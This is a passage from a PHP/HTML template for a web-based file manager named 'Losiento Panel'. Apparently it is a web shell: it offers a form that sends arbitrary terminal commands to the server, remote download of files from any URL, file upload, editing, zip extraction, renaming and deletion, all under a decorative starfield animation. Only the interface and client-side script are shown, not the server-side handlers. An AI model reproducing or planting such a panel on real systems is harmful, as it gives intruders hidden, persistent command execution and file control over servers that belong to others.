                <input type="file" name="zipfile" class="card-file" accept=".zip" required>
                <button type="submit" class="grad-btn">Extract</button>
            </form>
        </div>

        <!-- TERMINAL -->
        <div class="card">
            <div class="card-title"><i class="fas fa-terminal ic-yellow"></i> Terminal</div>
            <form method="POST" action="<?= $SELF ?>?path=<?= urlencode($cwd) ?>&action=terminal" autocomplete="off">
                <input type="text" name="cmd" class="card-input" placeholder="Enter command..." style="font-family:'Courier New',monospace;" value="<?= htmlspecialchars($lastCmd) ?>">
                <button type="submit" class="grad-btn">Run</button>
            </form>
            <?php if ($terminalOutput !== ''): ?>
            <div class="term-output"><?= htmlspecialchars($terminalOutput) ?></div>
            <?php endif; ?>
        </div>

        <!-- CREATE -->
        <div class="card">
            <div class="card-title"><i class="fas fa-plus-circle ic-purple"></i> Create</div>
            <form method="POST" action="<?= $SELF ?>?path=<?= urlencode($cwd) ?>&action=create" id="createForm">
                <input type="text" name="name" class="card-input" placeholder="Name" required>
                <select name="ctype" id="createType" class="card-select">
                    <option value="file">File</option>
                    <option value="folder">Folder</option>
                </select>
                <textarea name="content" id="createContent" class="card-textarea" placeholder="File content..."></textarea>
                <button type="submit" class="grad-btn">Create</button>
            </form>
        </div>

        <!-- REMOTE DL -->
        <div class="card">
            <div class="card-title"><i class="fas fa-cloud-download-alt ic-purple"></i> Remote DL</div>
            <form method="POST" action="<?= $SELF ?>?path=<?= urlencode($cwd) ?>&action=remotedl">
                <input type="text" name="rurl" class="card-input" placeholder="https://example.com/file.zip" required style="font-family:'Courier New',monospace; font-size:12px;">
                <input type="text" name="rname" class="card-input" placeholder="Filename (optional)">
                <button type="submit" class="grad-btn">Download</button>
            </form>
        </div>

    </div>

    <!-- ===== EDIT FILE ===== -->
    <?php if ($editFile !== ''): ?>
    <div class="edit-panel show">
        <div class="edit-header">
            <h3><i class="fas fa-edit"></i> Editing: <?= htmlspecialchars(basename($editFile)) ?></h3>
            <div class="edit-actions">
                <form method="POST" action="<?= $SELF ?>?path=<?= urlencode($cwd) ?>" onsubmit="document.getElementById('hiddenContent').value=document.getElementById('editorContent').value;">
                    <input type="hidden" name="action" value="savefile">
                    <input type="hidden" name="filepath" value="<?= htmlspecialchars($editFile) ?>">
                    <input type="hidden" name="content" id="hiddenContent">
                    <button type="submit" class="btn btn-save"><i class="fas fa-save"></i> Save</button>
                </form>
                <button type="button" class="btn" style="background:#555" onclick="location.href='<?= $SELF ?>?path=<?= urlencode($cwd) ?>'">✕ Close</button>
            </div>
        </div>
        <textarea id="editorContent"><?= htmlspecialchars($editContent) ?></textarea>
    </div>
    <?php endif; ?>

    <!-- ===== TABEL FILE ===== -->
    <div class="file-table-wrap">
        <table id="fmTable">
            <thead>
                <tr>
                    <th style="width:38%">Name</th>
                    <th style="width:9%">Size</th>
                    <th style="width:8%">Perm</th>
                    <th style="width:14%">Modified</th>
                    <th style="width:31%">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if ($relativePath !== ''): ?>
                <tr data-href="<?= $SELF ?>?path=<?= urlencode(dirname($cwd)) ?>">
                    <td colspan="5"><a href="<?= $SELF ?>?path=<?= urlencode(dirname($cwd)) ?>"><i class="fas fa-level-up-alt icon-folder"></i> .. (Parent Directory)</a></td>
                </tr>
                <?php endif; ?>

                <?php if (empty($items)): ?>
                <tr><td colspan="5" style="text-align:center;color:#666;padding:30px;cursor:default;">📁 Folder kosong</td></tr>
                <?php endif; ?>

                <?php foreach ($items as $item):
                    $isDir = ($item['type'] === 'dir');
                    $nameH = htmlspecialchars($item['name'], ENT_QUOTES);
                    $openHref = $isDir
                        ? $SELF . '?path=' . urlencode($item['path'])
                        : $SELF . '?path=' . urlencode($cwd) . '&action=edit&target=' . urlencode($item['name']);
                    $ext = strtolower(pathinfo($item['name'], PATHINFO_EXTENSION));
                    $icon = 'fa-file';
                    if ($ext === 'php') $icon = 'fa-file-code';
                    elseif (in_array($ext, ['html','htm','css','js','json','xml'])) $icon = 'fa-file-code';
                    elseif (in_array($ext, ['jpg','jpeg','png','gif','svg','webp','ico'])) $icon = 'fa-file-image';
                    elseif (in_array($ext, ['zip','rar','tar','gz','7z'])) $icon = 'fa-file-archive';
                    elseif ($ext === 'sql') $icon = 'fa-database';
                    elseif (in_array($ext, ['txt','md','log','ini','env'])) $icon = 'fa-file-alt';
                    elseif ($ext === 'pdf') $icon = 'fa-file-pdf';
                    elseif (in_array($ext, ['mp4','avi','mkv','mov'])) $icon = 'fa-file-video';
                    elseif (in_array($ext, ['mp3','wav','ogg'])) $icon = 'fa-file-audio';
                ?>
                <tr data-href="<?= htmlspecialchars($openHref) ?>">
                    <td>
                        <a href="<?= htmlspecialchars($openHref) ?>"><i class="fas <?= $icon ?> <?= $isDir ? 'icon-folder' : 'icon-file' ?>"></i> <?= $nameH ?><?= $isDir ? '/' : '' ?></a>
                    </td>
                    <td class="size-col"><?= $isDir ? '—' : formatSize($item['size']) ?></td>
                    <td class="size-col"><?= $item['perm'] ?></td>
                    <td class="date-col"><?= $item['date'] ?></td>
                    <td>
                        <div class="action-btns">
                            <?php if (!$isDir): ?>
                            <button type="button" class="mini-btn mini-edit" data-act="edit" data-target="<?= $nameH ?>"><i class="fas fa-edit"></i> Edit</button>
                            <button type="button" class="mini-btn mini-dl" data-act="download" data-target="<?= $nameH ?>"><i class="fas fa-download"></i></button>
                            <?php endif; ?>
                            <button type="button" class="mini-btn mini-zip" data-act="zip" data-target="<?= $nameH ?>"><i class="fas fa-file-archive"></i> Zip</button>
                            <?php if (!$isDir && $ext === 'zip'): ?>
                            <button type="button" class="mini-btn" style="background:#e67e22" data-act="unzip" data-target="<?= $nameH ?>"><i class="fas fa-box-open"></i> Extract</button>
                            <?php endif; ?>
                            <button type="button" class="mini-btn mini-ren" data-act="rename" data-target="<?= $nameH ?>"><i class="fas fa-i-cursor"></i></button>
                            <button type="button" class="mini-btn mini-del" data-act="delete" data-target="<?= $nameH ?>"><i class="fas fa-trash"></i></button>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <div class="footer-bar">
        Losiento Panel © <?= date('Y') ?> | Root: <?= htmlspecialchars($root) ?> | <?= count($items) ?> item
    </div>
</div>

<!-- ===== PROMPT MODAL (rename) ===== -->
<div class="prompt-overlay" id="promptOverlay">
    <div class="prompt-box">
        <h4 id="promptTitle">Input</h4>
        <input type="text" id="promptInput" placeholder="Masukkan nama...">
        <div class="prompt-actions">
            <button type="button" class="btn-cancel" onclick="closePrompt()">Cancel</button>
            <button type="button" class="btn-ok" id="promptOk">OK</button>
        </div>
    </div>
</div>

<div class="notif" id="notifBox"></div>

<script>
const SELF        = <?= json_encode($SELF) ?>;
const currentPath = <?= json_encode(urlencode($cwd)) ?>;
const okMsg       = <?= json_encode($ok) ?>;
const errMsg      = <?= json_encode($err) ?>;

/* ==========================================================
   LANGIT MALAM
   ========================================================== */
(function() {
    const canvas = document.getElementById('starfield');
    const ctx = canvas.getContext('2d');
    let stars = [], meteors = [];

    function resize() {
        canvas.width  = window.innerWidth;
        canvas.height = window.innerHeight;
        initStars();
    }

    function initStars() {
        stars = [];
        const count = Math.min(500, Math.floor((canvas.width * canvas.height) / 3200));
        for (let i = 0; i < count; i++) {
            stars.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                r: Math.random() * 1.4 + 0.2,
                phase: Math.random() * Math.PI * 2,
                speed: 0.004 + Math.random() * 0.018,
                hue: Math.random() < 0.12 ? 'blue' : (Math.random() < 0.08 ? 'warm' : 'white')
            });
        }
    }

    function starColor(hue, alpha) {
        if (hue === 'blue') return 'rgba(150,180,255,' + alpha + ')';
        if (hue === 'warm') return 'rgba(255,230,180,' + alpha + ')';
        return 'rgba(255,255,255,' + alpha + ')';
    }

    function spawnMeteor() {
        meteors.push({
            x: Math.random() * canvas.width * 0.7 + canvas.width * 0.2,
            y: Math.random() * canvas.height * 0.3,
            vx: -(4 + Math.random() * 4),
            vy: 2 + Math.random() * 2,
            life: 0,
            maxLife: 60 + Math.random() * 40
        });
    }

    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        for (const s of stars) {
            s.phase += s.speed;
            const a = 0.25 + Math.abs(Math.sin(s.phase)) * 0.75;
            ctx.beginPath();
            ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
            ctx.fillStyle = starColor(s.hue, a.toFixed(2));
            ctx.fill();
            if (s.r > 1.1) {
                ctx.strokeStyle = starColor(s.hue, (a * 0.35).toFixed(2));
                ctx.lineWidth = 0.6;
                ctx.beginPath();
                ctx.moveTo(s.x - s.r * 3, s.y); ctx.lineTo(s.x + s.r * 3, s.y);
                ctx.moveTo(s.x, s.y - s.r * 3); ctx.lineTo(s.x, s.y + s.r * 3);
                ctx.stroke();
            }
        }
        if (Math.random() < 0.006 && meteors.length < 2) spawnMeteor();
        for (let i = meteors.length - 1; i >= 0; i--) {
            const m = meteors[i];
            m.x += m.vx; m.y += m.vy; m.life++;
            const fade = 1 - m.life / m.maxLife;
            const tailX = m.x - m.vx * 12;
            const tailY = m.y - m.vy * 12;
            const grad = ctx.createLinearGradient(m.x, m.y, tailX, tailY);
            grad.addColorStop(0, 'rgba(255,255,255,' + (0.9 * fade).toFixed(2) + ')');
            grad.addColorStop(1, 'rgba(255,255,255,0)');
            ctx.strokeStyle = grad;
            ctx.lineWidth = 1.6;
            ctx.beginPath();
            ctx.moveTo(m.x, m.y);
            ctx.lineTo(tailX, tailY);
            ctx.stroke();
            if (m.life >= m.maxLife || m.x < -100 || m.y > canvas.height + 100) meteors.splice(i, 1);
        }
        requestAnimationFrame(animate);
    }

    window.addEventListener('resize', resize);
    resize();
    animate();
})();

/* ---------- NOTIFIKASI ---------- */
function showNotif(msg, type) {
    const box = document.getElementById('notifBox');
    box.textContent = msg;
    box.className = 'notif ' + type;
    box.style.display = 'block';
    setTimeout(() => { box.style.display = 'none'; }, 3500);
}
if (okMsg)  showNotif(okMsg, 'success');
if (errMsg) showNotif(errMsg, 'error');

/* ---------- CREATE: toggle konten saat pilih Folder ---------- */
const createType    = document.getElementById('createType');
const createContent = document.getElementById('createContent');
function syncCreateType() {
    const isFolder = createType.value === 'folder';
    createContent.style.display = isFolder ? 'none' : 'block';
    createContent.disabled = isFolder;
    if (isFolder) createContent.value = '';
}
createType.addEventListener('change', syncCreateType);
syncCreateType();

/* ---------- PROMPT MODAL (rename) ---------- */
let promptCallback = null;
function openPrompt(title, cb) {
    document.getElementById('promptTitle').textContent = title;
    document.getElementById('promptInput').value = '';
    document.getElementById('promptOverlay').classList.add('show');
    document.getElementById('promptInput').focus();
    promptCallback = cb;
}
function closePrompt() {
    document.getElementById('promptOverlay').classList.remove('show');
    promptCallback = null;
}
function doPrompt() {
    const val = document.getElementById('promptInput').value;
    if (promptCallback && val) promptCallback(val);
    closePrompt();
}
document.getElementById('promptOk').addEventListener('click', doPrompt);
document.getElementById('promptInput').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') doPrompt();
});

/* ---------- HIDDEN POST ---------- */
function submitHidden(query, name, value) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = SELF + '?path=' + currentPath + '&' + query;
    const input = document.createElement('input');
    input.type = 'hidden'; input.name = name; input.value = value;
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
}

/* ---------- KLIK TABEL (EVENT DELEGATION) ---------- */
const fmTable = document.getElementById('fmTable');
if (fmTable) {
    fmTable.addEventListener('click', function(e) {
        const btn = e.target.closest('button[data-act]');
        if (btn) {
            e.preventDefault();
            e.stopPropagation();
            handleAct(btn.dataset.act, btn.dataset.target);
            return;
        }
        if (e.target.closest('a')) return;
        const row = e.target.closest('tr[data-href]');
        if (row && row.dataset.href) {
            window.location.href = row.dataset.href;
        }
    });
}

function handleAct(act, target) {
    const t = encodeURIComponent(target || '');
    switch (act) {
        case 'edit':     location.href = SELF + '?path=' + currentPath + '&action=edit&target=' + t; break;
        case 'download': location.href = SELF + '?path=' + currentPath + '&action=download&target=' + t; break;
        case 'zip':      location.href = SELF + '?path=' + currentPath + '&action=zip&target=' + t; break;
        case 'unzip':    location.href = SELF + '?path=' + currentPath + '&action=unzip&target=' + t; break;
        case 'rename':   openPrompt('✏️ Rename: ' + target, n => submitHidden('action=rename&target=' + t, 'newname', n)); break;
        case 'delete':   if (confirm('Yakin hapus: ' + target + '?')) location.href = SELF + '?path=' + currentPath + '&action=delete&target=' + t; break;
    }
}

/* ---------- DRAG & DROP ke seluruh halaman → otomatis upload ---------- */
window.addEventListener('dragover', e => e.preventDefault());
window.addEventListener('drop',     e => e.preventDefault());
document.body.addEventListener('drop', function(e) {
    if (e.target.closest && e.target.closest('#extractForm')) return; // biarkan card extract sendiri
    const files = e.dataTransfer.files;
    if (files.length > 0) {
        const dt = new DataTransfer();
        for (let i = 0; i < files.length; i++) dt.items.add(files[i]);
        document.getElementById('uploadInput').files = dt.files;
        document.getElementById('uploadForm').submit();
    }
});

/* ---------- Fokus terminal setelah RUN ---------- */
<?php if ($action === 'terminal'): ?>
const cmdCard = document.querySelector('form[action*="terminal"] input[name=cmd]');
if (cmdCard) cmdCard.focus();
<?php endif; ?>
</script>

</body>
<?php endif; ?>
</html>
